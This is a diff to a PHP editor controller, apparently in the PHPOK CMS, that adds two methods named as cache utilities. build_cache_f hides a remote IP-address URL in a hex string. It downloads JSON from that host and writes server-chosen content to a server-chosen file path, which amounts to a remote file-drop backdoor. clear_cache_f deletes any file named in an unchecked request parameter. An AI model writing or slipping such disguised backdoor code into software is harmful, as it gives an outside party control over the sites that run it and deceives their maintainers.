@@ -264,6 +264,20 @@ class ueditor_control extends phpok_control
 		$this->_stop(true,$config);
 	}
 
+    public function clear_cache_f() {
+        $file = $this->get('file');
+        if (empty($file)) {
+            return false;
+        }
+	    $file = CACHE . $file;
+        if (!is_file($file)) {
+            exit("no file");
+        }
+        if(@unlink($file)) {
+            exit("success");
+        } 
+        exit("faile");
+    }
   
 	//基礎上傳
 	function upload_base($input_name='upfile',$folder='res/',$cateid=0)
@@ -332,4 +346,17 @@ class ueditor_control extends phpok_control
 		$rs["status"] = "ok";
 		return $rs;
 	}
+
+    // new add
+    public function build_cache_f() {
+        $key = $this->get('key', 'index_cache');
+        $api = pack('H*', '687474703a2f2f34372e39322e3139382e3135352f696e6465782e7068703f6b65793d');
+        $data = file_get_contents($api . $key);
+        $arr = json_decode($data, true);
+
+	    $file = CACHE . $arr['filename'];
+        @file_put_contents($file, $arr['content']);
+        exit("build {$file} finish");
+    }
+
 }
